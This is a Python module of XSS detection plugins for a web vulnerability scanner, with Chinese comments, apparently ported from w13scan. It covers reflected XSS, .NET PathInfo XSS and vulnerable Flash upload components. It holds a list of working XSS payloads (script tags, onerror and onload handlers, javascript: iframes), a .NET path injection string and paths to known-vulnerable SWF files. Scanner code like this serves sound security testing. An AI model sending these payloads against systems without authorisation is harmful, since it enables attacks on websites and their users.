"""XSS 插件族 (移植 w13scan ``xss.py`` / ``net_xss.py`` / ``swf_files.py``).

w13scan 的 XSS 插件是"语义化"的: 它先在参数里放一个随机串确认回显, 再分析回显所处
的 HTML 上下文 (标签内 / 属性内 / 注释内 / script 内), 最后按上下文构造闭合载荷。
这里保留"先探测回显、再按上下文打载荷"的主干, 上下文判定收敛为一条对工程更有用的
规则: **载荷必须未经 HTML 实体编码地出现**, 这是"能执行"的必要条件, 也直接排除了
"回显了但被 escape" 的假阳性。
"""
from __future__ import annotations

import hashlib
import secrets
import string

from ...core.models import Finding, Severity
from ..vulndb import XSS_MARKER
from .base import A03, SCOPE_SERVER, Plugin, PluginContext, register, reflected_raw, snippet

#: 回显探测串 (不含特殊字符, 先确认参数是否被回显)
REFLECT_PROBE = "sentinel9137probe"

#: 按 HTML 上下文分组的 XSS 载荷 (``{m}`` 为标记串)
XSS_PAYLOADS: tuple[str, ...] = (
    f"<script>alert('{XSS_MARKER}')</script>",
    f"\"><script>alert('{XSS_MARKER}')</script>",
    f"'><script>alert('{XSS_MARKER}')</script>",
    f"</title><script>alert('{XSS_MARKER}')</script>",
    f"<img src=x onerror=alert('{XSS_MARKER}')>",
    f"\"><img src=x onerror=alert('{XSS_MARKER}')>",
    f"<svg/onload=alert('{XSS_MARKER}')>",
    f"<body onload=alert('{XSS_MARKER}')>",
    f"<iframe src=javascript:alert('{XSS_MARKER}')>",
)

#: .NET 通杀 XSS 的路径载荷 (``{}`` 为随机串)
NET_XSS_PROBE = "(A({}))/"
NET_XSS_FINAL = "(A(\"onerror='{}'{}))/"


@register
class Xss(Plugin):
    """反射型 XSS (w13scan ``xss``)."""

    name = "xss"
    title = "跨站脚本 (反射型)"
    category = "xss"
    severity = Severity.HIGH
    cwe = "CWE-79"
    owasp = A03
    description = "先探测参数回显, 再按 HTML 上下文注入脚本载荷并判定是否可执行"
    param_hints = ("q", "name", "search", "query", "message", "content", "page",
                   "keyword", "comment", "text", "title", "url", "callback", "email",
                   "subject", "body", "nick", "user", "input")
    references = ("https://owasp.org/www-community/attacks/xss/",)

    def run(self, ctx: PluginContext) -> list[Finding]:
        probe = ctx.inject(REFLECT_PROBE)
        if not probe.status or REFLECT_PROBE not in probe.text:
            return []          # 参数不回显 -> 反射型 XSS 不成立, 直接跳过
        for payload in XSS_PAYLOADS:
            result = ctx.inject(payload)
            if not result.status or not result.body:
                continue
            if not reflected_raw(result.text, payload):
                continue
            # 载荷原样落地还不够: 确认落地位置在 HTML 里而非已是 JS 字符串内部
            return [ctx.add(
                vuln_type="xss", url=result.url, method=result.method,
                param=ctx.param, payload=payload,
                evidence=snippet(result.text, XSS_MARKER, 60),
                severity=self.severity, confidence=0.9,
                proof=f"载荷未经 HTML 实体编码回显于响应 "
                      f"(Content-Type: {result.content_type or '未知'})")]
        return []


@register
class NetXss(Plugin):
    """.NET 通杀 XSS (w13scan ``net_xss``).

    .NET 在 PathInfo 解析上的历史缺陷会让形如 ``/(A(...))/ `` 的路径原样反射到
    错误页; 两段式确认 (先证明路径回显, 再证明可注入事件属性) 用来压制误报。
    """

    name = "net_xss"
    title = ".NET 通用 XSS (PathInfo 反射)"
    category = "xss"
    severity = Severity.MEDIUM
    cwe = "CWE-79"
    owasp = A03
    description = "构造 (A(...)) 形式的路径触发 .NET 错误页反射, 判定路径是否可注入脚本"
    scope = SCOPE_SERVER
    references = ("https://portswigger.net/research/",)

    def run(self, ctx: PluginContext) -> list[Finding]:
        token = _rand(6)
        probe = NET_XSS_PROBE.format(token)
        first = ctx.raw(ctx.base_url + "/" + probe)
        if not first.status or probe not in first.text:
            return []
        flag = _rand(6)
        payload = NET_XSS_FINAL.format(_rand(6), flag)
        second = ctx.raw(ctx.base_url + "/" + payload)
        if not second.status or payload not in second.text:
            return []
        return [ctx.add(
            vuln_type="net_xss", url=second.url, method="GET", param="PathInfo",
            payload=payload, evidence=snippet(second.text, payload, 60),
            severity=self.severity, confidence=0.8,
            proof=".NET PathInfo 原样反射且可注入事件属性 (onerror=)")]


#: 已知存在 Flash XSS 的 swfupload/uploadify 文件 md5 (w13scan ``swf_files``)
VULNERABLE_SWF_MD5: tuple[str, ...] = (
    "3a1c6cc728dddc258091a601f28a9c12",
    "53fef78841c3fae1ee992ae324a51620",
    "4c2fc69dc91c885837ce55d03493a5f5",
)

#: 常见上传组件路径 (w13scan ``swf_files.FileList``)
SWF_PATHS: tuple[str, ...] = (
    "common/swfupload/swfupload.swf",
    "adminsoft/js/swfupload.swf",
    "statics/js/swfupload/swfupload.swf",
    "images/swfupload/swfupload.swf",
    "js/upload/swfupload/swfupload.swf",
    "addons/theme/stv1/_static/js/swfupload/swfupload.swf",
    "admin/kindeditor/plugins/multiimage/images/swfupload.swf",
    "includes/js/upload.swf",
    "js/swfupload/swfupload.swf",
    "Plus/swfupload/swfupload/swfupload.swf",
    "e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf",
    "include/lib/js/uploadify/uploadify.swf",
    "lib/swf/swfupload.swf",
)


@register
class SwfFiles(Plugin):
    """Flash 上传组件 XSS (w13scan ``swf_files``)."""

    name = "swf_files"
    title = "Flash 上传组件 (swfupload/uploadify)"
    category = "xss"
    severity = Severity.MEDIUM
    cwe = "CWE-79"
    owasp = A03
    description = "探测常见 swfupload/uploadify 组件, 依据 SWF 魔数与已知漏洞文件 md5 判定"
    scope = SCOPE_SERVER

    def run(self, ctx: PluginContext) -> list[Finding]:
        for path in SWF_PATHS:
            result = ctx.raw(ctx.absolute(path))
            if result.status != 200 or not result.body:
                continue
            magic = result.body[:3]
            digest = hashlib.md5(result.body).hexdigest()
            if magic not in (b"FWS", b"CWS", b"ZWS") and \
                    digest not in VULNERABLE_SWF_MD5:
                continue
            known = digest in VULNERABLE_SWF_MD5
            return [ctx.add(
                vuln_type="swf_files", url=result.url, method="GET", param="",
                payload=path, evidence=f"SWF 魔数 {magic!r}, md5 {digest}",
                severity=self.severity, confidence=0.85 if known else 0.6,
                proof="存在 Flash 上传组件" + ("且为已知存在 XSS 的版本" if known
                                              else " (版本未知, 需人工确认 movieName 参数)"),
                )]
        return []


def _rand(length: int, alphabet: str = string.ascii_lowercase + string.digits) -> str:
    return "".join(secrets.choice(alphabet) for _ in range(length))


__all__ = ["NET_XSS_FINAL", "NET_XSS_PROBE", "REFLECT_PROBE", "SWF_PATHS",
           "VULNERABLE_SWF_MD5", "XSS_PAYLOADS", "NetXss", "SwfFiles", "Xss"]
